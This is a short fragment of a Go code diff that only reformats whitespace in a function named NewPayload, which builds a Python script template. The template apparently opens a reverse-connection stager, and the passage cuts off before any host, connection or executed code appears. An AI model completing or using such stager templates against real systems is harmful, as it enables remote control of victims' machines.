@@ -5,8 +5,8 @@ import (
 	"fmt"
 )
 
-func NewPayload() string{
-	
+func NewPayload() string {
+
 	template := fmt.Sprintf(`
 import socket,zlib,base64,struct,time
 for x in range(10):
